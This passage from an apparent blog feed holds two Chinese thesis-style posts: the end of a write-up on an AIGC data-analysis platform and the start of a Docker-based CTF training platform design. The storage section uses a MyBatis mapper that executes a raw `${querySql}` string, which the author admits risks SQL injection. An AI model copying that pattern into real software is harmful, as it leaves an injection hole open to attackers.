punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>headerList<span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取数据 </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">></span></span> dataMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span>  list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> dataList <span class="token operator">=</span> dataMap<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">ObjectUtils</span><span class="token operator">::</span><span class="token function">isNotEmpty</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//过滤 null </span>stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>dataList<span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>智能分析</strong></p><p>通过设定一个提示语的方式输入用户信息，然后将 AI 返回的结果进行拆分：切割后的空白部分、中间代码部分、文字部分，最后再拼接起来。最后，将 AI 的生成结果保存到数据库，并返回给前端。数据库成功添加数据如图 3-5 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\数据库存储数据展示.png" style="zoom: 50%;" /><center>图 3-5 数据库存储数据展示</center>#### 3.4 图表管理模块实现 <p>​前端开发一个列表页，支持按照图表名称搜索历史图表。后端创建路由和页面，在页面 MyChart 目录下 index.tsx 文件中编写获取需要的原始数据，并定义 state 变量来存储数据用于给页面展示。无美化下前端展示数据如图 3-6 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\无美化下前端历史数据展示.png" style="zoom:50%;" /><center>图 3-6 无美化下前端历史数据展示</center>​引入 Ant Design 的 List 组件，修改 List 组件中的内容。针对样式，对数据进行处理。增加了统一隐藏图表自身的 title，增加了分页，增加了搜索框，并添加了当网速较慢时loading 效果。美化后前端展示数据如图 3-7 所示。 <p>​AI 有时会生成不符合要求的脏数据，需要判断数据是否合法。这里选择检查三个地方：（1）检查开头是否有中文；（2）检查前后是否有回车和空行；（3）检查 xAxis、yAxis、series、type、data 等是否为被双引号包裹的非 JSON 格式代码。</p><img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\美化后前端历史数据展示.png" style="zoom:50%;" /><center>图 3-7 美化后前端历史数据展示</center>用户可以在图表管理界面看见自己曾经的操作结果，用户可以对其进行搜索、删除、修改等操作。在搜索栏输入图表名称可以搜索到自己想到的历史图表。如图 3-8 所示。 <img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\查找图表名称含有结果二字的历史记录.png" style="zoom:50%;" /><center>图 3-8 查找图表名称含有结果二字的历史记录</center>不同的图表也附带一些附加操作，例如下载功能。如图 3-9 所示。 <img src="D:\blog\shierjinghuang\source\_posts\结合AIGC技术的数据分析平台的设计与实现\对该图表进行下载.png" style="zoom:50%;" /><center>图 3-9 对该图表进行下载 </center>#### 3.5 系统优化 <h5 id="3-5-1-安全性">3.5.1 安全性</h5><p>当用户上传原始数据文件时，可能存在恶意攻击的可能。例如用户使用自己家庭网络上传一个非常巨大的文件的低成本攻击手段，来占用服务器的带宽和存储资源，导致服务器的负载和网络流量利用率大幅提高，要支付高昂的服务器使用费用。可以采取对文件大小、文件后缀、文件的内容以及利用第三方的审核功能对文件的合规性进行校验。这里采用了较为简单的前两个。在 ChartController.java 下的 genChartByAi 接口下编写校验文件代码。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//校验文件大小 </span><span class="token keyword">final</span> <span class="token keyword">long</span> ONE_MB <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024L</span><span class="token punctuation">;</span> <span class="token class-name">ThrowUtils</span><span class="token punctuation">.</span><span class="token function">throwIf</span><span class="token punctuation">(</span>size <span class="token operator">></span> ONE_MB<span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">.</span>PARAMS_ERROR<span class="token punctuation">,</span> <span class="token string">"文件超过 1M"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//校验文件后缀 </span><span class="token class-name">String</span> suffix <span class="token operator">=</span> <span class="token class-name">FileUtil</span><span class="token punctuation">.</span><span class="token function">getSuffix</span><span class="token punctuation">(</span>originalFilename<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> validFileSuffix <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"png"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"svg"</span><span class="token punctuation">,</span> <span class="token string">"webp"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"xl sx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">ThrowUtils</span><span class="token punctuation">.</span><span class="token function">throwIf</span><span class="token punctuation">(</span><span class="token operator">!</span>validFileSuffix<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">ErrorCode</span><span class="token punctuation">.</span>PARAMS_ERROR<span class="token punctuation">,</span> <span class="token string">" 文件后缀非法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-5-2-数据存储">3.5.2 数据存储</h5><p>​一般情况下是将每个图表的原始数据全部存放在同一个数据表（chart 表）的chartData 字段里方便数据的获取和管理，但 chartData 字段中的原始数据会存在数据量非常大的情况，随着图表数的增多，会导致查询 chart 表的速度变慢。而且用户是有查看原始数据和对原始数据进行简单查询的需求，如果把所有数据存放在一个字段（列） 中，在查询时只能获取这个列的所有内容。所以需要将原始数据从 chartData 字段的一个小方格中提取出来，将原始数据以表格的形式存储在一个独立的数据表中。这样的话，系统用户在查询数据的时候，不需要在 chart 表上一条条的查询，非常的耗时间，可以通过 id 号，到对应的数据表，在该独立数据表里进行数据查询，灵活且查询的快速；而且将原始数据从 chart 表里提取出来存储在另一个表里，就避免了恶性攻击获得所有的数据，增加了安全性。实现步骤如下：</p><p><strong>在 ChartMapper.xml 中定义 SQL 查询语句</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>queryChartData<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>string<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>map<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    $&#123;querySql&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>虽然 select * from chart_#{chartId}不够灵活，<code>$&#123;querySql&#125;</code>灵活但其将 SQL 语句完 全交给程序去传递，使用<code>$</code>符号会有 SQL 注入的风险。</p><p><strong>在 ChartMapper.java 中定义结果返回语句</strong></p><p>List&lt;Map&lt;String, Object&gt;&gt; queryChartData(String querySql);</p><p>该方法返回类型为 List&lt;Map&lt;String, Object&gt;&gt;表示返回的是一个由多个 map 组成的集合，每个 map 代表了一行查询结果，并将其封装成了一组键值对的形式的对象。其中，String 类型代表了键的类型为字符串，Object 类型代表了值得类型为任意对象，似得该方法可以适应不同类型的数据查询。</p><p><strong>创建测试类 ChartMapperTest.java</strong></p><p>将临时创建的测试表 chart_ 1777315720878694401 的原始数据所属 id 作为查询的 chartId，打印出返回结果。如图 3-10 和图 3-11 所示。</p><p>图 3-10 运行结果</p><p>图 3-11 Debug 结果</p><h5 id="3-5-3-限流">3.5.3 限流</h5><p>为了防止用户过度使用系统的 AI 模型，因为每次 AI 模型的调用都需要成本的，用户的恶意使用会导致成本的升高甚至会导致成本过高而破产，因此需要控制用户对 AI模型的调用次数来避免用户的恶意使用超支。但限制用户请求访问的次数仍然存在一定风险，用户仍可以通过疯狂调用来刷量，从而导致系统成本过度消耗。故需要限制单个用户在每秒只能使用一次，在前端随机放行一部分用户，而对其他用户进行限制，以确保系统不会被恶意用户占满。根据不同的对象，可以分为针对某个方法限流，针对某个用户限流和针对某个用户的某方法限流。根据服务器的数量，可以分为本地限流和分布式限流。本地限流是指每在本地设置一个服务器就要对该服务器单独设置限流的阈值，但是这样不好追踪访问请求是在哪个服务器上，是否可能多个服务器同时访问，因此比较适合只拥有一台服务器额情况。当服务器超过一个时，对每台服务器设置限制用户每秒请求访问次数，每个服务器都可以独立地控制用户的请求频率但并不能得知用户的访问请求在哪台服务器上，会存在风险。可以使用分布式限流把用户的使用频率等数据放到一个集中的存储进行统 计，例如 Redis，然后在网关集中进行限流和统计。实现步骤如下：</p><ol><li><p>创建 RedisssonConfig 配置类，用于初始化 RedissonClient 对象单例。</p></li><li><p>在 application.yml 中编写 redis 配置。</p></li><li><p>创建好redis客户端后，在manager目录下创建一个管理类RedisLimiterManager。</p></li><li><p>编写 RedisLimiterManager.java 专门提供 RedisLimiter 限流基础服务。Manager提供了通用能力，可以放在任何一个项目里使用。</p></li><li><p>创建测试类 RedisLimiterManagerTest.java，根据 RedisLimiterManager 中设置每秒最多访问 2 次，超过则会抛出异常“请求过于频繁”。结果如图 3-12 所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E7%BB%93%E5%90%88AIGC%E6%8A%80%E6%9C%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5C%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C.png" alt=""></p><center>图 3-12 测试结果 </center></li><li><p>在 genChartByAi 接口中设置一个限流判断，从而实现给每个用户分配一个限流器。当进行访问请求时，请求到达却没有获取到令牌时，则限流操作会抛出异常并终止请求；当请求到达并成功获取到令牌，则请求可以正常继续执行。</p></li></ol><h3 id="4-总结">4 总结</h3><p>​本文详细描述了结合 AIGC 结合AIGC技术的数据分析平台的设计与实现。想法产生于 AIGC技术在图书馆服务的应用与创新，利用 AI 对用户需求的解读，更加人性化、个性化方式提供用户所需的资源和服务，提高图书馆管理和服务效率，优化用户体验。故可以应用 AIGC 技术设计一个普通人也能简单操作就可以实现数据分析的平台。在数据分析平台开发方面，使用了 React + Ant Design Pro 作为了前端页面设计基础，使用了 MySQL数据库对上传数据和生成结果进行保存，使用了 Spring Boot 作为后端框架，并利用MyBatis Plus、Echarts、RabbitMQ 等实现平台功能。系统用户根据自己的想法，对自己的需求进行描述，并将自己电脑上的数据上传到平台上，可以是未经处理的，然后通过AI 模型对系统用户所描述的需求的理解，对用户的原始数据进行处理，最后为系统用户提供分析结论和图表。</p><p>​期待国内 AI 技术的发展，降低 AI 服务的成本。平台也需思考更好的 prompt 使 AI模型能够更精确理解并给出更符合预期的回答。在成本无法降低的时期，对成本的控制方案进行优化。</p><h3 id="参考文献">参考文献</h3><p>[1] 董添．AIGC 将对各行各业产生深刻影响[N]．中国证券报．2024 (A02)．</p><p>[2] 中国信息通信研究院，京东探索研究院．人工智能生成内容（AIGC）白皮书[R]．2022．</p><p>[3] GARTNER．2024 年重要战略技术趋势[R]．2024．</p><p>[4] 郭亚军，刘振阳，郭一若等．AIGC 大学生用户信息需求研究——以 ChatGPT为例[J]．情报科学，2024：1-25．</p><p>[5] 李晨阳．基于大数据处理技术的 BI 平台设计与开发[D]．北京：北京交通大学，2019：5-6．</p><p>[6] 车晓彤．AIGC 赋能档案数据资源开发的路径探析[J]．兰台世界，2024，(02)：104-107．</p><p>[7] 王永刚．大数据时代人工智能在计算机网络技术中的应用研究[J]．信息记录材料，2023 (01)：107-109．</p><p>[8] 赵停停．基于 MySQL 数据库技术的 Web 动态网页设计研究[J]．信息与电脑(理论版)，2023，35(17)：174-176．</p><p>[9] 张洋，黄楠，余厚强．AIGC 时代信息资源管理领域发展趋势[J]．图书馆论坛，2024：1-8．20[10] 程帅．服务网格下流量控制系统的设计与实现[D]．北京：北京邮电大学，2020：104-107．</p><p>[11] 张颖岚，卢絮，董洁等．生成式人工智能(AIGC)在科技情报研究工作中的应用[J]．科技和产业，2023，23(24)：159-164．</p><p>[12] 李白杨，白云，詹希旎等．人工智能生成内容（AIGC）的技术特征与形态演进[J]．图书情报知识，2023，40(01)：66-74．</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毕业论文 </tag>
            
            <tag> React </tag>
            
            <tag> SpringBoot </tag>
            
            <tag> AIGC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Docker容器的网络安全实验平台的设计与实现</title>
      <link href="/2025/03/31/%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2025/03/31/%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="基于docker容器的网络安全实验平台的设计与实现">基于Docker容器的网络安全实验平台的设计与实现</h3><p>摘要：CTF(Capture The Flag)是常见的网络安全竞赛形式，赛事靶场部署了诸如Reverse、Misc、Crypto等附件类考题与Web、Pwn等容器类考题。若容器类考题是静态部署的，则存在非预期解题的安全隐患。针对这一问题，设计了题目容器化的网络安全实验平台，将容器类的考题动态部署到Docker容器中，实现了容器类考题的动态部署，多用户在不同的容器中对同一试题进行解答，互相隔离，消除了安全隐患。实验平台采用Vue3+Element Plus+Go+MySQL的架构设计，使用Gorm技术连接数据库并进行数据管理。实验平台界面美观，功能齐全，具有较强的可维护性与可扩展性，为参赛练习者提供了考题丰富的安全训练环境。</p><p><strong>关键词</strong>：网络安全  Docker  CTF 竞赛</p><p>[TOC]</p><h3 id="引言">引言</h3><p>​2024年4月网络空间部队正式成立，标志着我国网络安全建设又迈入了一个新阶段。网络安全已经成为国家安全的重要组成部分，是中国式现代化建设的重要保障^[1]^。网络安全问题内容繁杂，从个人PC到大型企业网络甚至整个广域网，每一个层面都面临着各种不同的安全挑战。防范、化解信息化进程中的安全风险，特别是防止发生系统性、颠覆性风险，是我国网信工作的根本任务^[1]^。</p><p>​为了培养更多优秀的网络安全人才，网络安全实验平台是网络安全从业者、学生和爱好者进行实验、比赛和训练，提升自身的网络安全技能和知识的不二选择，同时网络安全靶场作为支撑前沿技术研究、网络安全人员培训的重要基础设施，得到各国政府、军队、企业和科研机构的高度重视[2]。但是，网络安全实验平台在使用过程中，因多用户的同时访问造成及对平台环境的渗透与更改，这些操作会影响到其他用户对平台的正常应用。</p><h3 id="1-环境与技术介绍">1 环境与技术介绍</h3><h4 id="1-1-网络安全实验平台">1.1 网络安全实验平台</h4><p>​网络安全平台主要用于网络安全实践和培训，为使用者提供了一个安全的、可供用户自由渗透的靶场环境，这些靶场环境往往与具体安全事件与安全风险对应。</p><p>​近些年在全球网络安全爱好者的自发贡献下，一批开源的网络安全平台如雨后春笋般出现，产生了如CTFd（Capture The Flag Director）等开源的网络安全实验平台，用于主持和管理CTF（Capture The Flag）竞赛^[3]^。当前免费开放的线上靶场已经有一定数量，大部分网络安全实验平台被高校用于竞赛训练。这些实验平台往往采用静态部署，落后于当前版本，初学者入门CTF门槛相对较高。目前的相关研究工作主要集中在传授式教学场景，借助实验系统辅助实现对特定知识点的教学目标^[4]^。然而，这种方式未能充分关注渗透测试所需的广泛专业知识、多样化的技术手段以及逆向思维突破困难等特点^[4]^。</p><h4 id="1-2-ctf">1.2 CTF</h4><p>​CTF是一种经典的网络安全竞赛形式。CTF竞赛测试参与者在解决各种网络安全挑战和应对攻击方面的各项能力，包括团队合作，快速学习乃至经验。在CTF类型的比赛中，多名参赛者独立或者组队解决各种问题，包括安全杂项 MISC（缩写来源于单词miscellaneous）、网络安全Web、逆向工程 Re（缩写来源于单词reverse）、二进制安全 PWN（简称来源于单词安全俚语）、密码学Crypto（缩写来源于单词Cryptography），甚至社会工程学方面的知识和技能。</p><p>​CTF赛事通常设有时间限制，题目的分值通常会随着成功解题次数的增加而降低，在部分比赛中会有长时间未解出题目分值上升的机制。在通常情况下这意味着参与者需要在规定的时间内，尽可能快地完成尽可能多的题目，以得到尽可能高的分数。通常，最终得分是根据参与者所获得的分值来确定排名。</p><p>​随着“全国大学生信息安全竞赛创新实践能力赛”，“强网杯”等知名网络安全赛事采用CTF竞赛模式，CTF竞赛的吸引力越来越强，在网络安全人才培养中的作用也越来越重要^[5]^。</p><h4 id="1-3-docker">1.3 Docker</h4><p>​Docker是一种通过GO语言开发的应用容器引擎，用于开发、部署应用程序。利用Docker可以将应用程序及其所需的运行环境打包到独立、可移植的Dockerfile中。在任何支持Docker的平台，包括Linux和高版本的windows环境中均可以通过Docker实现从Dockerfile文件到Docker Image的构建。并由此创建可以执行的Docker容器，而无需担心环境配置的问题。</p><p>​从架构上来说Dockerfile是应用程序的基础，包括源代码及运行环境、库和配置等依赖项。Docker Image是中间件，其由Dockerfile通过构建产生。而Docker容器是应用程序的运行态，是通过Docker Image创建并允许的实例。从软件生命周期的观点上讲，Dockerfile、Docker Image与Docker Container分别代表软件生命周期的三个不同阶段，Dockerfile面向软件生命周期的设计阶段，Docker Image面向软件生命周期的测试阶段，成为应用程序交付标准，Docker Container面向软件生命周期的软件运行和维护阶段。Docker架构如图1-1所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps1.png" alt=""></p><center>图1-1 Docker架构示意图</center>​Docker Container中的每个接口都是虚拟的，在实际的部署中应将其映射到服务器或者主机的真实端口上。容器之间要相互通信的前提是两者必须有属于同一个网络的网卡[6]。由此，在基于Docker的网络安全实验平台中，通过Docker Image来创建应用程序的运行实例Docker Container，暨用户实际接触到的靶场环境，彼此之间的资源是相互隔离的。<p>​基于此，网络安全实验靶场就可以生成多个同时运行的Docker Container，而这些实例之间相互隔离，互不影响。这种方式可以实现用户对靶场环境的独占，从而保证了网络安全实验平台的正常运行。</p><h4 id="1-4-vue">1.4 Vue</h4><p>​Vue框架其提供了声明式、组件化的方法用于构建交互式界面。并支持.Vue单文件组件这一前端格式。Vue 3.0提供了许多重大改进和新特性，提高了性能、可维护性和开发体验。通过重新设计虚拟DOM和响应式系统，Vue 3.0能够更高效地追踪状态变化，并在需要时进行更新，从而提高了应用程序的渲染速度和响应性。</p><p>​其组件功能允许将页面划分为独立的组件，并对每个组件进行单独设计，在Vue3.0组件得到进一步的细化。在Vue3中，借助Prop传递、Mixins混入技术和组合式API，能够实现组件的进一步组合，这意味着可以将一些公共逻辑封装成独立对象，并在多个组件中引入和使用。可以将多个组件组合在一起构建更复杂的用户界面。Vue组件复用如图1-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps2.png" style="zoom: 80%;" /><center>图1-2 Vue组件树状结构</center>​即使考虑组件进一步细分产生的更小组件与混入技术的影响，在Vue程序开发中，组件结构依旧被设计为一棵不断嵌套的树。当节点组件需要被调用时，需要在根组件中导入，该组件将会以默认的形式暴露给外部，组件就可以作为独立模块被使用。<h4 id="1-5-go">1.5 Go</h4><p>​Go又称Golang是一种静态强类型、编译型语言。Go其简单高效的特性，旨在解决大型软件项目中面对的一些挑战，如复杂性管理、性能优化和可维护性。在大规模项目中。Go语言具有高效率、并发安全的优势，同时具有足够的表达力和功能性。在网络服务中优势尤为明显，具有广泛的应用前景。</p><p>​Go语言的可维护性也是其优秀特性之一。其强类型系统和严格的编码规范可以帮助开发团队保持代码的清晰和一致性，减少了在维护和扩展项目时可能出现的错误和问题。此外，Go语言还提供了一套丰富的标准库和工具，包括用于测试、文档生成、性能分析等的工具，进一步提升了代码的可维护性和可测试性。</p><h4 id="1-6-开发环境">1.6 开发环境</h4><p>​本项目的开发过程中同时使用了HBuilder X和Visual Studio Code两款代码编辑器。分别用于开发项目的前端Vue项目与后端的Go框架与Docker操作模块。</p><p>​VS Code是一款轻量级代码编辑器，支持多种编程语言和文件类型，适用于各种规模的项目和开发环境。其提供了优秀的集成开发环境，包括调试、终端窗口、版本控制等功能。同时有很强的代码分析能力，使得开发过程更加流畅高效。</p><p>​HBuilder X是一款专为Vue打造的一款集成开发环境，能够提供适合Vue项目的开发环境。同时其拥有强大的语法提示功能。</p><h4 id="1-7-wangeditor">1.7 WangEditor</h4><p>​WangEditor是基于JavaScript开发的编辑器，其具有兼容性好，插件化，支持自定义样式等特点。涵盖了各式各样的文本编辑功能，能够为用户提供良好的编写体验，同时可以实现对Markdown语法的兼容，便于常见的Markdown格式内容的转载。由于插件化的特点WangEditor可以集成到各种Web应用中，作为项目的一部分被调用。</p><h3 id="2-系统需求分析">2 系统需求分析</h3><p>​本文在参考现有安全企业的网络安全实验平台设计思路与实现的基础上，对网络安全实验平台的功能需求进行分析，并进行了改进。将传统的静态的测试环境与Docker容器进行有机结合，设计了基于Docker容器的动态实现方案。</p><h4 id="2-1-功能需求分析">2.1 功能需求分析</h4><p>​基于现实因素考虑，网络安全实验平台的设计定位于，面向个体和组织的开放训练环境，主要提供针对各种网络安全漏洞场景的目标环境，供个体或组织训练网络安全实践技能[7]。</p><p>​根据网络安全实验平台的功能分析，网络安全实验平台大致可为两个核心模块与其他通用模块，两个核心模块暨用户功能模块和系统管理员的后台管理模块。为了保证系统信息及系统本身的机密性、完整性与可用性(CIA)，管理员和用户身份会有不同的功能权限。通用模块是系统的基础包括登录模块与排行榜等功能。</p><p>​在系统中，管理员用户负责系统维护，包括发布公告，上传问题，文章管理，问题管理和用户管理等内容，以用户身份登录成功后主要可以进行文章阅读、题目环境申请、作答及发布解题报告等功能。</p><p>（1）管理员模块</p><p>​管理员身份由Computer_Users表中的permissions位进行标记。管理员通过身份验证登录后，在后台对平台进行各种管理。在题目管理中，管理员可以上传新题目、对涉及镜像与容器题目的对应关系进行调整及题目相关信息修改或删除。同时管理员可以对远程服务器中，用户下发的靶机容器进行管理。在用户管理中，管理员可以查看用户的个人信息，进行信息的修改、重置密码、用户删除等功能。管理员同时还具有上传文章、公告及文章管理的能力。</p><p>（2）用户模块</p><p>​本系统用户模块的功能较少，用户可以查看排行榜和其他用户发表的文章，在练习靶场中解答对应题目，发布文章等功能。</p><h4 id="2-2-非功能性需求分析">2.2 非功能性需求分析</h4><p>​网络安全实验平台不仅包括基本的功能需求，还需要满足一系列非功能性需求，以及对社会和行业的更高层次的需求。非功能性需求指的是系统除了具备功能性需求外，还必须具备的一些性质。具体到网络安全实验平台比如机密性、完整性与可用性等，更进一步网络安全实验平台在网络安全人才培养上也有其需求。网络安全实验平台应当在满足基本功能需求的同时，重视非功能性需求，确保平台具备简单易操作、安全可靠以及准确无误的特点，为用户提供良好的实验体验和数据支持。</p><p>​（1）CIA：网络安全实验平台更需要注重平台的机密性、完整性与可用性，网络安全实验平台对安全的需要同时来自于内部与外部，来自平台外部的威胁包括合法用户的非授权访问和非法用户的渗透攻击。而来自系统内部风险的则是合法用户访问过程及对题目渗透中可能触发的风险溢出。</p><p>​（2）可维护性与可扩展性：为了实现平台的长期可靠运行和后续内容的扩充，网络安全实验平台同样需要不断迭代。所以在设计之时需要对系统进行清晰的设计，使系统架构清晰明了，方便后续扩展和维护。</p><p>​（3）对网络安全技能培养的需要：本系统定位于面向个体和组织的开放训练环境，对网络从业人员及网络安全初学者，包括专业院校学生提供有关网络安全技能全领域的能力培养是网络安全实验平台的出发点。网络安全人才的实际培养过程中，需要用到各种网络环境和大量安全数据来做分析，网络靶场可以方便地提供相关的数据源，为研究对象、实验场景、背景知识做支撑[8]。毫无疑问，CTF比赛的流行及本身具有的趣味性和挑战性，能够作为辅助教学的绝佳平台[9]。在教学中结合CTF的赛题，甚至举办一些校内的CTF竞赛，让学生在比赛中进步，提高其安全实战能力，培养国家需要的应用型人才[9]。</p><p>​（4）性能是软件系统中至关重要的非功能性特性之一，它直接影响着用户体验、系统的可用性以及业务流程的顺畅进行。性能不仅仅关乎系统的响应速度，还包括系统的吞吐量、资源利用率以及并发处理能力等多个方面。网络安全实验平台关于性能的设计主要集中于Docker容器的下发与回收机制。</p><h3 id="3-系统设计">3 系统设计</h3><p>​针对静态部署的靶场环境存在的问题，本项目设计在靶场题目中使用Docker容器环境的网络安全实验平台。整个网络安全实验平台采用Vue3+Element Plus+Go+MySQL的架构。前端采用Vue3框架，后端则使用Gin框架进行设计开发。同时使用Gorm技术链接数据库，管理系统数据，单独开启一个线程使用Redis作为存入数据库的缓冲。在Web和PWN题目中采用部署在远程服务器上的Docker容器作为题目环境，借助Go语言对Docker操作的便利性实现服务器中Docker实例。</p><h4 id="3-1-总体设计">3.1 总体设计</h4><p>​网络安全实验平台由管理员单元、用户单元和通用单元三部分组成。管理员单元的功能主要包括部署新的题目容器、用户管理、文章管理和公告发布等功能。用户单元的功能主要包括注册账号、个人信息维护、在练习场申请实验容器、提交解题思路和发表文章等。通用单元包括排行榜、文章上传和登录注册等功能。此外实验平台后端还负责管理各项用户与平台交互产生的信息、实验容器的分发和回收、与数据库交互以维护平台信息。系统模块功能如图3-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps3.jpg" style="zoom: 80%;" /><center>图3-1 平台模块图</center>系统采用了分层架构和MVC模式的架构，如图3-2所示<img src="D:\blog\shierjinghuang\source\_posts\基于Docker容器的网络安全实验平台的设计与实现\wps4.png" style="zoom: 80%;" /><center>图3-2 系统架构图</center>#### 3.2 详细设计<h5 id="3-2-1-登录注册模块设计">3.2.1 登录注册模块设计</h5><p>​由于实验平台实际需要，管理员用户为直接写入数据库，通过注册模块注册的用户均为普通用户。当用户访问实验平台时，可以通过主页引导进入登录页面。用户登录时，系统验证用户名和凭据是否匹配数据库信息，匹配则登录成功，否则返回错误提示。用户登录注册模块的具体流程如图3-3所示。</p><img 